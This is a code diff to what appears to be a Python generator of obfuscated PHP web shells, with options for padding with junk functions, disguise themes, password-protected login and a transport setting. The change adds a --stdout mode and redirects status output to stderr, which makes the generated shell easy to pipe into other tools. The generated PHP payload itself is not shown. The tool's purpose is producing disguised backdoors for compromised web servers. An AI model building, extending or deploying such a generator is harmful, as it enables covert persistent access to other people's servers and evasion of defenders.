@@ -1540,7 +1540,9 @@ if (isset($_GET['{route_param}'])) {{
 # SHELL GENERATION
 # ─────────────────────────────────────────────────────────────────────────────
 
-def generate(args):
+def generate(args, info=None):
+    if info is None:
+        info = sys.stdout
     rng = random.Random(args.seed)
 
     junk_count = args.junk if args.junk is not None else rng.randint(20, 80)
@@ -1563,13 +1565,13 @@ def generate(args):
     if args.no_auth:
         bcrypt_hash = ''
     else:
-        print(f"[*] Computing bcrypt hash (cost=12)...", end=' ', flush=True)
+        print(f"[*] Computing bcrypt hash (cost=12)...", end=' ', flush=True, file=info)
         bcrypt_hash = compute_bcrypt_hash(args.password, seed=args.seed)
         if bcrypt_hash:
-            print(f"OK ({bcrypt_hash[:20]}...)")
+            print(f"OK ({bcrypt_hash[:20]}...)", file=info)
         else:
             bcrypt_hash = args.password.encode().hex()
-            print("FALLBACK hex (php not found)")
+            print("FALLBACK hex (php not found)", file=info)
 
     used_php = set()
     # PHP core names
@@ -1671,7 +1673,9 @@ Examples:
     parser.add_argument('-u', '--user', default='sysadmin',
                         help='Login username (default: sysadmin)')
     parser.add_argument('-o', '--output', default='shell.php',
-                        help='Output file (default: shell.php)')
+                        help='Output file path (default: shell.php). Accepts absolute or relative paths, e.g. -o /tmp/shell.php')
+    parser.add_argument('--stdout', action='store_true', default=False,
+                        help='Print generated PHP to stdout instead of writing a file. Status messages go to stderr.')
     parser.add_argument('-j', '--junk', type=int, default=None,
                         help='Number of junk functions (default: random 20-80, max 200)')
     parser.add_argument('-t', '--theme', choices=list(CSS_THEMES.keys()) + ['poly', 'none'], default=None,
@@ -1698,21 +1702,28 @@ Examples:
     if args.no_junk:
         args.junk = 0
 
-    php = generate(args)
+    # When --stdout is set, info messages go to stderr so PHP can be piped cleanly
+    info = sys.stderr if args.stdout else sys.stdout
 
-    with open(args.output, 'w', encoding='utf-8') as f:
-        f.write(php)
+    php = generate(args, info=info)
+
+    if args.stdout:
+        sys.stdout.write(php)
+    else:
+        with open(args.output, 'w', encoding='utf-8') as f:
+            f.write(php)
 
     theme_used = args.theme or '(random from named themes)'
     junk_used  = args.junk if args.junk is not None else '(random 20-80)'
 
-    print(f"[+] Output    : {args.output}")
-    print(f"[+] Size      : {len(php):,} bytes")
-    print(f"[+] Theme     : {theme_used}")
-    print(f"[+] Junk      : {junk_used} functions")
-    print(f"[+] Transport : {args.transport}")
+    if not args.stdout:
+        print(f"[+] Output    : {args.output}", file=info)
+    print(f"[+] Size      : {len(php):,} bytes", file=info)
+    print(f"[+] Theme     : {theme_used}", file=info)
+    print(f"[+] Junk      : {junk_used} functions", file=info)
+    print(f"[+] Transport : {args.transport}", file=info)
     if args.seed:
-        print(f"[+] Seed      : {args.seed}")
+        print(f"[+] Seed      : {args.seed}", file=info)
 
 if __name__ == '__main__':
     main()
